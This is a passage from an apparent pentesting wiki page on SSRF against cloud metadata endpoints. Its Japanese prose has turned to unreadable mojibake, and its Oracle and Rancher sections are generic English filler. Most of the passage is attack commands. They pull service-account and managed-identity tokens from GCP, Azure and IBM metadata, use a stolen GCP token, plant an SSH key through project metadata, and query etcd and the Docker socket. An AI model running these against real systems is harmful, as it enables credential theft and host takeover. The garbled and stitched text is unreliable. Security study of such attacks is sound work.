echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
echo "  Name: $sa"
echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"
```
ç¾åœ¨ã€Betaã§ã¯ãƒ˜ãƒƒãƒ€ãƒ¼ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ï¼ˆMathias Karlsson @avlidienbrunnã•ã‚“ã€ã‚ã‚ŠãŒã¨ã†ï¼‰
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```
{% hint style="danger" %}
**ç›—ã¿å‡ºã—ãŸã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹**ã«ã¯ã€æ¬¡ã®æ‰‹é †ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š
```bash
# Via env vars
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list

# Via setup
echo "<token>" > /some/path/to/token
gcloud config set auth/access_token_file /some/path/to/token
gcloud projects list
gcloud config unset auth/access_token_file
```
{% endhint %}

### SSHã‚­ãƒ¼ã®è¿½åŠ  <a href="#3e24" id="3e24"></a>

ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŠ½å‡ºã—ã¾ã™ã€‚
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```
ãƒˆãƒ¼ã‚¯ãƒ³ã®ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  {
"issued_to": "101302079XXXXX",
"audience": "10130207XXXXX",
"scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
"expires_in": 2443,
"access_type": "offline"
}
```
ä»Šã€SSHã‚­ãƒ¼ã‚’ãƒ—ãƒƒã‚·ãƒ¥ã—ã¦ãã ã•ã„ã€‚

{% code overflow="wrap" %}
```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
-H "Content-Type: application/json"
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```
{% endcode %}

## Digital Ocean <a href="#9f1f" id="9f1f"></a>

{% hint style="warning" %}
AWSã®ãƒ­ãƒ¼ãƒ«ã‚„GCPã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ã‚ˆã†ãªã‚‚ã®ã¯å­˜åœ¨ã—ãªã„ãŸã‚ã€ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ãƒœãƒƒãƒˆã®è³‡æ ¼æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã¯æœŸå¾…ã—ãªã„ã§ãã ã•ã„ã€‚
{% endhint %}

ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯[`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)ã§åˆ©ç”¨å¯èƒ½ã§ã™ã€‚
```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```
## Azure <a href="#cea8" id="cea8"></a>

### Azure VM

[**ã“ã“ã§**ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux)ã€‚

* **å¿…ãš** `Metadata: true` ãƒ˜ãƒƒãƒ€ã‚’å«ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* `X-Forwarded-For` ãƒ˜ãƒƒãƒ€ã‚’å«ã‚“ã§ã¯ã„ã‘ã¾ã›ã‚“ã€‚

{% tabs %}
{% tab title="Bash" %}
{% code overflow="wrap" %}
```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions

echo "Instance details"
curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"

echo "Load Balancer details"
curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"

echo "Management Token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

echo "Graph token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"

echo "Vault token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

echo "Storage token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
```
{% endcode %}
{% endtab %}

{% tab title="PS" %}
```bash
# Powershell
Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
## User data
$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

# Paths
/metadata/instance?api-version=2017-04-02
/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```
{% endtab %}
{% endtabs %}

### Azure App Service

**env**ã‹ã‚‰`IDENTITY_HEADER`ã¨`IDENTITY_ENDPOINT`ã®å€¤ã‚’å–å¾—ã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®å€¤ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚µãƒ¼ãƒãƒ¼ã¨é€šä¿¡ã™ã‚‹ãŸã‚ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã§ãã¾ã™ã€‚

ã»ã¨ã‚“ã©ã®å ´åˆã€æ¬¡ã®ã„ãšã‚Œã‹ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ãŒå¿…è¦ã§ã™ï¼š

* [https://storage.azure.com](https://storage.azure.com/)
* [https://vault.azure.net](https://vault.azure.net/)
* [https://graph.microsoft.com](https://graph.microsoft.com/)
* [https://management.azure.com](https://management.azure.com/)
```bash
# Check for those env vars to know if you are in an Azure app
echo $IDENTITY_HEADER
echo $IDENTITY_ENDPOINT

# You should also be able to find the folder:
ls /opt/microsoft
#and the file
ls /opt/microsoft/msodbcsql17

# Get management token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
# Get graph token
curl "$IDENTITY_ENDPOINT?resource=https://graph.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# API
# Get Subscriptions
URL="https://management.azure.com/subscriptions?api-version=2020-01-01"
curl -H "Authorization: $TOKEN" "$URL"
# Get current permission on resources in the subscription
URL="https://management.azure.com/subscriptions/<subscription-uid>/resources?api-version=2020-10-01'"
curl -H "Authorization: $TOKEN" "$URL"
# Get permissions in a VM
URL="https://management.azure.com/subscriptions/<subscription-uid>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/<VM-name>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
curl -H "Authorization: $TOKEN" "$URL"
```

```powershell
# API request in powershell to management endpoint
$Token = 'eyJ0eX..'
$URI='https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# API request to graph endpoint (get enterprise applications)
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using AzureAD Powershell module witho both management and graph tokens
$token = 'eyJ0e..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc

# Try to get current perms over resources
Get-AzResource
## The following error means that the user doesn't have permissions over any resource
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
+ CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException
+ FullyQualifiedErrorId :
Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```
## IBM Cloud <a href="#2af0" id="2af0"></a>

{% hint style="warning" %}
IBMã§ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ãªã„ãŸã‚ã€IBMã‚¯ãƒ©ã‚¦ãƒ‰ã®VMå†…ã«ã„ã¦ã‚‚ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

{% code overflow="wrap" %}
```bash
export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
-H "Metadata-Flavor: ibm"\
-H "Accept: application/json"\
-d '{
"expires_in": 3600
}' | jq -r '(.access_token)'`

# Get instance details
curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq

# Get SSH keys info
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq

# Get SSH keys fingerprints & user data
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq

# Get placement groups
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq

# Get IAM credentials
curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
```
{% endcode %}

## Packetcloud <a href="#2af0" id="2af0"></a>

[`https://metadata.packet.net/userdata`](https://metadata.packet.net/userdata)ã§åˆ©ç”¨å¯èƒ½ãªãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚

## OpenStack/RackSpace <a href="#2ffc" id="2ffc"></a>

(ãƒ˜ãƒƒãƒ€ãƒ¼ãŒå¿…è¦ã§ã™ã‹ï¼Ÿä¸æ˜)
```
http://169.254.169.254/openstack
```
## HP Helion <a href="#a8e0" id="a8e0"></a>

(ãƒ˜ãƒƒãƒ€ãƒ¼ã¯å¿…è¦ã§ã™ã‹ï¼Ÿä¸æ˜)
```
http://169.254.169.254/2009-04-04/meta-data/
```
## Oracle Cloud <a href="#a723" id="a723"></a>

Oracle Cloud is a cloud computing platform provided by Oracle Corporation. It offers a wide range of cloud services, including infrastructure as a service (IaaS), platform as a service (PaaS), and software as a service (SaaS). With Oracle Cloud, users can deploy and manage applications and services on the cloud, leveraging the scalability and flexibility of the platform.

Oracle Cloud provides various features and functionalities that make it a popular choice among businesses and developers. These include high-performance computing capabilities, data storage and management services, networking solutions, and security features. Additionally, Oracle Cloud offers integration with other Oracle products and services, allowing users to build comprehensive and customized solutions.

When it comes to security, Oracle Cloud implements robust measures to protect user data and ensure the confidentiality, integrity, and availability of resources. This includes encryption of data at rest and in transit, identity and access management controls, network security, and monitoring and auditing capabilities.

Overall, Oracle Cloud is a reliable and feature-rich cloud platform that enables organizations to leverage the power of cloud computing for their business needs. Whether it's deploying applications, managing data, or building scalable solutions, Oracle Cloud provides the tools and services required to succeed in the cloud environment.
```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```
## Alibaba <a href="#51bd" id="51bd"></a>
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```
## Kubernetes ETCD <a href="#c80a" id="c80a"></a>

APIã‚­ãƒ¼ã¨å†…éƒ¨IPãŠã‚ˆã³ãƒãƒ¼ãƒˆã‚’å«ã‚€å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```
## Docker <a href="#ac0b" id="ac0b"></a>
```
http://127.0.0.1:2375/v1.24/containers/jsonSimple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```
## Rancher <a href="#8cb7" id="8cb7"></a>

Rancher is an open-source container management platform that allows you to easily deploy and manage containers in your infrastructure. It provides a user-friendly interface for managing containerized applications and supports various container orchestration frameworks such as Kubernetes, Docker Swarm, and Apache Mesos.

Rancher is commonly used in cloud environments to simplify the deployment and management of containerized applications. It provides features like load balancing, service discovery, and scaling, making it a popular choice for organizations looking to leverage the benefits of containerization.

However, like any other software, Rancher is not immune to security vulnerabilities. One common vulnerability that can be exploited in Rancher deployments is Server-Side Request Forgery (SSRF).

SSRF is a type of vulnerability that allows an attacker to make requests to internal or external resources from the perspective of the vulnerable server. This can be used to bypass security controls and access sensitive information or perform actions on behalf of the server.

In the context of Rancher, an SSRF vulnerability can be particularly dangerous as it can allow an attacker to make requests to internal services or cloud APIs that are accessible from the Rancher server. This can potentially lead to unauthorized access to sensitive data, compromise of cloud resources, or even complete takeover of the Rancher server.

To mitigate the risk of SSRF in Rancher deployments, it is important to follow security best practices such as:

- Implementing proper input validation and sanitization to prevent malicious input from being processed by the server.
- Restricting the outbound network traffic from the Rancher server to only necessary destinations.
- Using network-level controls such as firewalls and security groups to restrict access to internal services and cloud APIs.
- Regularly updating Rancher and its dependencies to ensure that any known vulnerabilities are patched.

By following these best practices, you can reduce the risk of SSRF vulnerabilities in your Rancher deployments and ensure the security of your containerized applications.
```
curl http://rancher-metadata/<version>/<path>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
